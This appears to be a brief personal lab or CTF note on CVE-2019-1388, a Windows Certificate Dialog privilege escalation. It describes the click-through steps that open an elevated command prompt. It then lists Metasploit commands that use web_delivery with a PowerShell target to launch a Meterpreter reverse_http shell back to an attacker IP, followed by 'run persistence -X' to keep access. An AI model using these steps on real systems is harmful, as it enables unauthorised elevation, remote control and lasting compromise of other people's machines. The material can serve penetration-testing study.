CVE-2019-1388 Detail - An elevation of privilege vulnerability exists in the Windows Certificate Dialog when it does not properly enforce user privileges, aka 'Windows Certificate Dialog Elevation of Privilege Vulnerability'.

When running a privilged program, it asks for the password. if we click show more details and then take a look at the Certificate it opens a IE with permissions. now we do crtl+s and instead of save we open a cmd, wich will have privileges.

Using metasploit to gain shell access:

use exploit/multi/script/web_delivery
show targets
set target 2 - 2 is the powershell
set lhost 10.8.252.117
set payload windows/meterpreter/reverse_http
run -j
copy the code and paste it on the privilged shell in windows
run persistence -X - make the shell come up
